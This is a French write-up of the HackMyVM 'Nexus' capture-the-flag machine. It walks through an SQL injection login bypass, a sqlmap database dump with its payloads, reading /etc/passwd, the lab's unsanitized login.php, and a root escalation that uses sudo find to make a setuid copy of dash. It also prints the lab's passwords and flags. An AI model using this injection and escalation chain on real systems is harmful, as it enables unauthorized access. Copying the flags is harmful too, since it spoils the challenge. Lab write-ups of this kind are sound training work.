---
title: "Solution du CTF Nexus de HackMyVM.eu"
tags: [CTF,HackMyVM]
---

### Nitro

Nexus est un CTF plutôt simple et classique proposé sur HackMyVM.eu.

Un scan Nmap nous remonte deux services : SSH et HTTP.

La page d'accueil ne montrant qu'une image de fond, je lance `FeroxBuster` :

```console
$ feroxbuster -u http://192.168.56.109/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -n -x php
                                                                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.109/
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       47l       86w      825c http://192.168.56.109/
200      GET     1641l     5430w    75134c http://192.168.56.109/index2.php
200      GET       26l       36w      352c http://192.168.56.109/login.php
[####################] - 2m   1273819/1273819 0s      found:3       errors:0      
[####################] - 2m   1273819/1273819 14171/s http://192.168.56.109/
```

La page `index2.php` retourne une jolie interface dans le style terminal pour hacker, thème rouge.

Pas grand-chose à première vue dans les menus accessibles, mais je finis par tomber sur une référence à `auth-login.php`.

### 1 ou 1

Le script existe bien sûr le serveur, c'est une mire de login. Quelques essais rapides montrent que la page est vulnérable à une faille SQL et qu'on peut bypasser l'authentification avec `1' or '1'='1`.

Une fois connecté, on n'a cependant aucune marge de manœuvre, car la page est vide, on va donc dumper la base avec sqlmap dans l'espoir de trouver une info utile.

```console
$ sqlmap -u http://192.168.56.109/login.php --data "user=toto&pass=TOTO" --risk 3 -level 5 --dbms mysql
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.5#pip}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting

[16:33:42] [INFO] testing connection to the target URL
[16:33:43] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:33:43] [INFO] testing if the target URL content is stable
[16:33:43] [INFO] target URL content is stable
[16:33:43] [INFO] testing if POST parameter 'user' is dynamic
[16:33:43] [WARNING] POST parameter 'user' does not appear to be dynamic
[16:33:43] [INFO] heuristic (basic) test shows that POST parameter 'user' might be injectable (possible DBMS: 'MySQL')
--- snip ---
[16:34:04] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 665 HTTP(s) requests:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=toto' OR NOT 9349=9349-- mlDp&pass=TOTO

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: user=toto' AND (SELECT 1371 FROM(SELECT COUNT(*),CONCAT(0x716a707a71,(SELECT (ELT(1371=1371,1))),0x716b627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hzcN&pass=TOTO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=toto' AND (SELECT 9031 FROM (SELECT(SLEEP(5)))ORoF)-- DrFe&pass=TOTO
---
[16:34:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.62
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```

Avec l'option `--dbs` de sqlmap, j'obtiens la liste des bases :

```
available databases [6]:
[*] information_schema
[*] mysql
[*] Nebuchadnezzar
[*] performance_schema
[*] sion
[*] sys
```

J'enchaine avec `--tables` et découvre que les bases `Nebuchadnezzar` et `sion` disposent toutes les deux d'une table `users`.

```
Database: Nebuchadnezzar
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame2025       | admin    |
+----+--------------------+----------+

Database: sion
Table: users
[2 entries]
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | F4ckTh3F4k3H4ck3r5 | shelly   |
| 2  | cambiame08         | admin    |
+----+--------------------+----------+
```

La connexion avec les identifiants n'apporte rien de plus. Avec `--file-read /etc/passwd` je peux confirmer qu'il y a un utilisateur `shelly` sur le système.

Je peux aussi lire le `login.php` qui effectivement ne permet rien d'autre que l'authentification :

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Conexión a la base de datos (¡ajustar usuario y contraseña!)
$mysqli = new mysqli("localhost", "root", "test", "sion");

if ($mysqli->connect_error) {
    die("Error de conexión: " . $mysqli->connect_error);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['user'] ?? '';
    $password = $_POST['pass'] ?? '';

    // Vulnerabilidad intencional: sin sanitización
    $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $mysqli->query($query);

    echo "<pre style='color:#00ff00;'>";

    if ($result && $result->num_rows > 0) {
        echo "Acceso concedido. Bienvenido, $username.";
    } else {
        echo "Acceso denegado.";
    }

    echo "</pre>";
}
?>
```

### sudo find a root shell

Les identifiants de `shelly` fonctionnent sur SSH.

```console
$ ssh shelly@192.168.56.109
**************************************************************
HackMyVM System                                              *
                                                             *
   *  .  . *       *    .        .        .   *    ..        *
 .    *        .   ###     .      .        .            *    *
    *.   *        #####   .     *      *        *    .       *
  ____       *  ######### *    .  *      .        .  *   .   *
 /   /\  .     ###\#|#/###   ..    *    .      *  .  ..  *   *
/___/  ^8/      ###\|/###  *    *            .      *   *    *
|   ||%%(        # }|{  #                                    *
|___|,  \\         }|{                                       *
                                                             *
                                                             *
Wellcome to Nexus Vault.                                     *
**************************************************************

shelly@192.168.56.109's password: 

######################
DONT TOUCH MY SYSTEM #
######################
Last login: Thu May  8 22:44:41 2025 from 192.168.1.10
shelly@NexusLabCTF:~$ ls -al
total 28
drwx------ 4 shelly shelly 4096 May  8 22:51 .
drwxr-xr-x 3 root   root   4096 Mar 28 16:18 ..
-rw-r--r-- 1 shelly shelly  220 Mar 28 16:18 .bash_logout
-rw-r--r-- 1 shelly shelly 3530 May  8 17:15 .bashrc
drwxr-xr-x 3 shelly shelly 4096 Apr 21 22:00 .local
-rw-r--r-- 1 shelly shelly  807 Mar 28 16:18 .profile
drwxr-xr-x 2 root   root   4096 May  8 17:07 SA
shelly@NexusLabCTF:~$ ls -al SA
total 12
drwxr-xr-x 2 root   root   4096 May  8 17:07 .
drwx------ 4 shelly shelly 4096 May  8 22:51 ..
-rw-r--r-- 1 root   root    804 May  8 17:07 user-flag.txt
shelly@NexusLabCTF:~$ cat SA/user-flag.txt 

   ▄█    █▄      ▄▄▄▄███▄▄▄▄    ▄█    █▄  
  ███    ███   ▄██▀▀▀███▀▀▀██▄ ███    ███ 
  ███    ███   ███   ███   ███ ███    ███ 
 ▄███▄▄▄▄███▄▄ ███   ███   ███ ███    ███ 
▀▀███▀▀▀▀███▀  ███   ███   ███ ███    ███ 
  ███    ███   ███   ███   ███ ███    ███ 
  ███    ███   ███   ███   ███ ███    ███ 
  ███    █▀     ▀█   ███   █▀   ▀██████▀  
                                        
HackMyVM
Flag User ::  82kd8FJ5SJ00HMVUS3R36gd
```

L'escalade de privilèges requiert juste de bien connaître la commande `find`.

```console
shelly@NexusLabCTF:~$ sudo -l
sudo: unable to resolve host NexusLabCTF: Temporary failure in name resolution
Matching Defaults entries for shelly on NexusLabCTF:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD, use_pty

User shelly may run the following commands on NexusLabCTF:
    (ALL) NOPASSWD: /usr/bin/find
```

Je vais l'utiliser pour rendre une copie de `dash` setuid root :

```console
shelly@NexusLabCTF:~$ which dash
/usr/bin/dash
shelly@NexusLabCTF:~$ cp /usr/bin/dash /tmp/g0tr00t
shelly@NexusLabCTF:~$ sudo /usr/bin/find /tmp/ -name g0tr00t -exec chown root:root {} \;
sudo: unable to resolve host NexusLabCTF: Temporary failure in name resolution
shelly@NexusLabCTF:~$ sudo /usr/bin/find /tmp/ -name g0tr00t -exec chmod 4755 {} \;
sudo: unable to resolve host NexusLabCTF: Temporary failure in name resolution
shelly@NexusLabCTF:~$ /tmp/g0tr00t  -p
# id
uid=1000(shelly) gid=1000(shelly) euid=0(root) groups=1000(shelly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
# cd /root
# ls
Sion-Code
# ls -al
total 32
drwx------  5 root root 4096 May  8 22:52 .
drwxr-xr-x 18 root root 4096 Mar 28 16:10 ..
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rw-------  1 root root    0 May  8 16:24 .fim_history
drwxr-xr-x  3 root root 4096 Apr 19 15:59 .local
-rw-------  1 root root    2 Apr 19 18:10 .mysql_history
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Mar 28 16:10 .ssh
drwxr-xr-x  2 root root 4096 May  8 16:43 Sion-Code
# ls Sion-Code
use-fim-to-root.png
```

On ne trouve pas de flag mais une image. Le flag est cependant dans les fichiers (tags exif ou ajouté en fin) :

```console
$ strings use-fim-to-root.png  | grep -i flag
;HMV-FLAG[[ p3vhKP9d97a7HMV79ad9ks2s9 ]]
```
